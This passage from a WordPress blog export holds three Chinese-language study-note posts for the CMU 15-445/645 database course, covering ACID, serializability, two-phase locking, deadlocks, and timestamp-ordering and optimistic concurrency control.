<p>事务是在数据库中执行的一连串不可分割的操作。由于数据库只关心对哪些数据对象进行读写，因此事务可以看作一连串的读写操作。事务以<code>BEGIN</code>命令开始，<code>COMMIT</code>或<code>ABORT</code>结束。接收到<code>COMMIT</code>命令后DBMS保留所有的修改或将所有修改撤销，<code>ABORT</code>命令将所有修改撤销。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>ACID</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Atomicity</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>原子性：指事务的所有操作或者全部成功，如果一个不成功则前面的操作也视为无效。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Logging</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS将执行过的所有操作保存到日志中，需要<code>ABORT</code>时通过日志找到需要撤销的操作。日志会被保存在内存和磁盘中。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Shadow Paging</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>在磁盘上复制被修改的页面副本，如果事务成功执行，则将原来的页替换为修改后的副本。由于不能进行循序访问，会产生磁盘碎片，而且每次都会伴随一个复制操作，这种方式效率比较低下。SystemR采用这种方式，现代数据库系统很少使用。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Consistency</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果数据库在事务开始执行时处于正确的状态，事务结束后仍处于正确状态，则称事务保持了一致性。一致性包括<strong>数据库一致性</strong>以及<strong>事务一致性</strong>，数据库一致性通过完整性约束实现，事务一致性由上层应用保证。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Isolation</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果用户提交了多个事务，我们希望这些事务运行时各自之间不会相互影响，并且无论这些事务以什么样的顺序执行，最终的结果都和单线程执行得到的结果一样。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DBMS中通过并发控制协议实现多个事务之间的隔离性。并发控制协议可以分为<strong>悲观</strong>和<strong>乐观</strong>两类。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>隔离级别</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>可串行性保证了事务并发运行时的一致性，但降低了并发度。DBMS提供多种可选的隔离级别，以获得更高的并发度。但更弱的隔离级别需要程序员在上层保证一致性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>可串行化：</strong>保证可串行化调度。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>可重复读：</strong>保证可重复读，只允许读取已提交的数据，且一个事务两次读取同一个数据期间其他事务不得更新该数据。但不要求事务之间可串行化。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>已提交读：</strong>只允许读取已提交数据，不要求可重复读。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>未提交读：</strong>允许读取未提交数据。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>事务调度</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果几个事务以不同的顺序执行，并且执行结果相等，则称这几个顺序是等价调度。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果两个事务需要操作同一个对象，并且其中一个操作是写，则这两个事务存在冲突。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>不可重复读(R-W冲突)</strong>：<br><img src="https://img.ironmanzzm.top/blog-img/20220322103847.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>脏读(W-R冲突)</strong>：<br><img src="https://img.ironmanzzm.top/blog-img/20220322103934.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>W-W冲突（W-W冲突)</strong>：<br><img src="https://img.ironmanzzm.top/blog-img/20220322104038.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>依赖图</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>涉及多个事务的调度会产生很多种可能，依赖图可以帮助我们快速判别调度是否是可串行的。每个事务在依赖图中都是一个顶点。如果两个事务存在依赖关系，即存在两个操作对同一个操作执行写，必须先执行<code>T_i</code>再执行<code>T_j</code>，则在依赖图中画一条从<code>i</code>到<code>j</code>的边。只要存在一个环，则该调度是不可串行化的。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220322132122.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220322132040.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:embed {"url":"https://zhuanlan.zhihu.com/p/57579023"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://zhuanlan.zhihu.com/p/57579023
</div></figure>
<!-- /wp:embed -->

<!-- wp:heading {"level":3} -->
<h3>conflict serializability</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果多个事务可以顺序执行，事务之间的操作不会交替，则称该调度是<strong>可串行的</strong>。只要各个事务各自的一致性得到保证，则实现整个串行调度的一致性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>冲突可串行：</strong><br><img src="https://img.ironmanzzm.top/blog-img/20220322130453.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>冲突不可串行：</strong><br><img src="https://img.ironmanzzm.top/blog-img/20220322130750.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>View Serializability</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>假设现在有两个调度<code>S_1</code>和<code>S_2</code>需要在<code>A</code>上执行一个冲突操作，只要保证：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>两个调度能正确地读取A的初始值</li><li>在<code>S_1</code>中事务<code>T_1</code>在<code>T_2</code>写后读，则在<code>S_2</code>中也保持相同的顺序。</li><li>如果<code>T_1</code>在<code>S_1</code>中对A执行最后的写入，则<code>S_2</code>中也同样在最后写入。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>即只要保证两个调度开始和结束的状态一样，就满足视图可串行化。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220322133336.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220322133438.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>视图可串行要求DBMS知道各个事务中会执行什么样的操作，但实际上DBMS无法预测一个client要执行的所有操作，因为事务除了包括SQL语句，还包括编程语言层面的操作。因此视图可串行实现起来并不容易。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220322133801.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Durability</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>一个事务提交后，应该被保存到非易失性介质中，使其之后也能被随时读取。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Conclusion</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了保证ACID约束，数据库需要牺牲性能。因此很多新型数据库都放弃了ACID约束，只保证数据库的可用性。</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[并发控制和恢复组件是DBMS架构中的重要组成部分，保证了多个事务之间并发执行的正确性和遇到异常后可以数据不丢失。]]></excerpt:encoded>
		<wp:post_id>319</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:30:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:30:43]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:33:25]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:33:25]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[14-concurrency-control-theory]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_40ce2f8825d9c16bc4539e518b1b1bfa]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[317]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[15 Two-Phase Locking]]></title>
		<link>http://www.ironmanzzm.top/?p=323</link>
		<pubDate>Fri, 20 May 2022 12:41:41 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=323</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading -->
<h2>Lock Manager</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Lock Manager保存关于锁的元数据，比如权限、谁正在拥有/申请锁等。事务需要操作数据向Lock Manager申请锁。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Lock Types</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Shared Lock</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>可以同时被多个事务持有，执行读操作前申请共享锁。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Exclusive Lock</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>同一时间只能被一个事务持有，执行修改操作时申请互斥锁。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>然而共享互斥锁并不能保证冲突可串行化，以不同的方式获得锁可能会造成冲突：<br><img src="https://img.ironmanzzm.top/blog-img/20220325201745.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Two-Phase Locking</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>PL是一种并发控制协议，让事务在开始执行前事先获得所有需要的资源的锁，然后再执行。这样就保证了执行的冲突可串行性。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Phase #1: Growing</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Growing阶段事务向Lock Manager申请到所有需要的锁。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Phase #2: Shrinking</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>事务执行完毕后Lock Manager释放分配给事务的锁，进入该阶段后不允许再申请新的锁。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>两阶段锁可以保证产生的调度都是冲突可串行的，但存在以下三个问题：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>有可能会导致cascading abort</li><li>有一些可串行调度可能不被两阶段锁允许</li><li>导致死锁</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>例如下图中T2在T1提交前获得了T1释放的锁，然而T1执行过程中发生了错误需要丢弃，因此T2有可能（并不一定是，但调度器无法看到全局情形）读取到不正确的数据（Dirty Reads），也需要丢弃。这就是<strong>Cascading Abort</strong><br><img src="https://img.ironmanzzm.top/blog-img/20220325203307.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Strong Strict Two-Phase Locking</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了解决2PL可能会出现的脏读和级联丢弃，SS2PL约定事务必须在提交后才能释放锁。SS2PL可以保证任何可能引起冲突的操作会被强制按照串行顺序执行。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Deadlock</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>当两个事务互相等待对方释放资源时，就会产生死锁。解决死锁可以有两种方法：</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Detection</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS后台运行死锁检测算法，通过事务间的wait-for图检测当前是否存在死锁。如果存在死锁，选择一个事务（victim）进行回滚。回滚范围可以是整个事务，也可以是部分操作回滚。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Prevention</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为每个事务分配时间戳，以时间戳为优先级，越老的事务优先级越高。则可以产生以下两种策略：</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Wait-Die("Old Waits for Young")</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果申请资源的事务优先级比持有资源的优先级高，则申请者等待持有者完成；如果申请者优先级较低，则被丢弃。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Wound-Wait("Young Waits for Old")</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果申请资源的事务优先级比持有资源的事务优先级高，则持有者将被丢弃并释放锁；否则申请者进入等待。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220325210952.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>注意，以上两种预防策略中，一个事务被丢弃后重启获得的时间戳应该和原来的时间戳一样。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Lock Ranularityies</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>上面的几种锁都是对单一资源的访问权限进行限制，如果一个事务需要更新大量元组，就需要获得大量的锁。获得lock的开销往往比获得latch的开销大得多。因此DBMS需要考虑事务获得的锁的粒度，如果在更大粒度上（例如对表）加锁，就可以减少事务申请锁的次数。但增加粒度的代价是降低并行性。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Lock Hierarchy</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>层次锁<br><img src="https://img.ironmanzzm.top/blog-img/20220325211544.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Itention Lock</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>层次锁中如果要对某个叶结点进行修改，要对祖先节点加锁，与他相邻的兄弟节点也无法被其他事务访问。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在祖先节点上申请意向锁，表明事务要在子结点上进行读写，而不限制其他事务在祖先节点上申请不冲突的锁。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>意向锁协议增加了并发性，减少了锁的开销，对于以下两类事务尤其适用：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>只访问几个数据的短事务</li><li>读取整个文件或者一组文件的长事务</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>类似的封锁协议可以用于数据以有向无环图组织的数据库系统中。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>该协议也存在死锁，但有方法可以减少死锁发生的频度，甚至消除死锁。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Lock Escalation</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>通常不需要在事务中人为的添加锁，但是进行一些关键修改时，有必要在事务中显式加锁。很多商用数据库都支持显式加锁（该功能并不是SQL标准）。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220325214240.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>幻读问题</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果系统允许插入删除操作，2PL可能会出现幻读，因为系统无法在一个先前不存在但在运行期间被其他线程插入的元组上加锁。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220326002131.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>可通过层次锁、条件锁或间隙锁解决。或者在事务提交前进行反复多次扫描，确保读到的数据时最新的。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>条件锁</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>条件锁是在WHERE子句的条件上加锁，这样同一时间内就不会有多个事务在满足条件的同一组元组上操作。这种锁方法来自SystemR，现在已经基本没有系统使用。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220326094052.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>索引锁</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果在WHERE指定的字段上存在索引，就可以给该索引加锁，避免幻读问题。</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[Lock Manager保存关于锁的元数据，比如权限、谁正在拥有/申请锁等。事务需要操作数据向Lock Manager申请锁。]]></excerpt:encoded>
		<wp:post_id>323</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:41:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:41:41]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:41:42]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:41:42]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[15-two-phase-locking]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[324]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[16 Timestamp Ordering Concurrency Control]]></title>
		<link>http://www.ironmanzzm.top/?p=326</link>
		<pubDate>Fri, 20 May 2022 12:44:18 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=326</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading -->
<h2>Introduction</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>当预期事务执行过程中会频繁出现线程争用时，就需要使用锁对资源使用加以限制，因此锁是一种<strong>悲观</strong>策略。如果预期争用并不是那么频繁，就可以使用更<strong>乐观</strong>的算法。时间戳顺序协议通过给每个事务指定时间戳来实现事务串行化，因而在使用资源前不需要申请锁。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Basic Timestamp Ordering Protocal</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>数据库在某个时间点（事务执行期任意时间点）为每个事务记录时间戳<code>T_i</code>，时间戳是递增且唯一的。时间戳可以通过系统时钟或者<a href="https://zhuanlan.zhihu.com/p/56146800">逻辑时间</a>获得。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了实现可重复读，事务<code>T_i</code>会保存一份<code>X</code>的本地副本。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Reads</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>该协议需要为每个元组记录上一次读和写的时间戳。当某个事务需要读取某个元组上的值时，会对比自身时间戳<code>TS(T_i)</code>和元组时间戳<code>W-TS(X)</code>。如果元组<code>X</code>上一次写入的时间戳<code>W-TS(X)</code>大于<code>TS(T_i)</code>，说明事务读到了不应该读到的值，需要执行<code>ABORT</code>；如果元组时间戳不小于事务时间戳，则允许读取，并将元组时间戳的R字段更新为<code>max(R-TS(X), TS(T_i))</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Writes</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果<code>TS(T_i)</code>小于<code>R-TS(X)</code>或<code>W-TS(X)</code>，执行<code>ABORT</code>并重启<code>T_i</code>；反之则可以写入，并更新元组时间戳的W字段为<code>max(W-TS(X), TS(T_i))</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220325235303.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220325235459.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>Tomas write Rule</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>思考出现<code>TS(T_i) &lt; W-TS(X)</code>的情况，这意味着当前事务对X所做的修改在未来会被另一个事务覆盖。因此该事务的修改不写回磁盘也不会造成影响。因此事务无需进行ABORT，只要在本地副本上继续执行即可。 使用该规则后产生的调度有可能不满足冲突可串行。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220325235541.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Recoverable Schedules</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>一个事务依赖的所有事务都提交后，该事务在出现问题后就可以被恢复。但是Basic T/O并不能保证事务被提交时依赖的事务也全部被提交，因此一个事务被提交后也不一定是可恢复的。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>性能问题</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Basic T/O需要为每个元组保存副本，如果一个事务需要操作很多元组，将带来极大的内存开销。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>操作数很多的事务可能因为后执行的短事务插队导致需要频繁地重启，出现饥饿问题。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Optimistic Concurrency Control</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS为每个事务分配私有空间，保存要操作的数据副本。事务对各自的副本进行修改，然后写回。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Read Phase</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>读取数据并保存为副本，对副本进行操作。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Validation Phase</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>事务所有操作执行完毕后，DBMS为该事务分配一个时间戳，并检查结果正确性。验证时需要保证验证的方向是相同的（统一向前检查或统一向后检查）。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>系统在同一时候只能验证一个事务，如果有多个事务需要验证，就需要在事务的read set/write set上申请latch。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Backward Validation</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>检查在该事务之前已经提交的所有事务。如果已提交的事务中对当前事务也用到的某个值进行了修改，就需要丢弃当前事务。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Forward Validation</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>找到所有还未提交的事务，如果当前事务在某个事务开始读写之前提交，则检查下一个未提交事务。如果未提交的事务读/写到了某个被当前事务修改的值，就将当前事务丢弃。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220326001929.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>Write Phase</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>写回磁盘 。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Conclusion</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果任务读写的数据比较分散，事务之间冲突较少，采用乐观并发控制可以减少上锁带来的开销。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Partition-Based Timestamp Ordering</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将数据库划分为不相交的水平分区，通过时间戳对该分区涉及的事务进行排序，并让它们以串行的顺序执行。分区粒度越小，事务并行效率越高。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>每个分区拥有一个锁和事务队列，当一个事务在某个分区队列上时间戳最小，就获得该分区的锁。这个事务获得所有需要的分区的锁时，就可以开始执行。但由于无法事先知道哪些分区是需要的，所以在运行时如果需要访问其他分区，就将当前事务丢弃，重新申请所有需要的分区锁。</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[当预期事务执行过程中会频繁出现线程争用时，就需要使用锁对资源使用加以限制，因此锁是一种悲观策略。如果预期争用并不是那么频繁，就可以使用更乐观的算法。时间戳顺序协议通过给每个事务指定时间戳来实现事务串行化，因而在使用资源前不需要申请锁。]]></excerpt:encoded>
		<wp:post_id>326</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:44:18]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:44:18]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:44:18]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:44:18]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[16-timestamp-ordering-concurrency-control]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
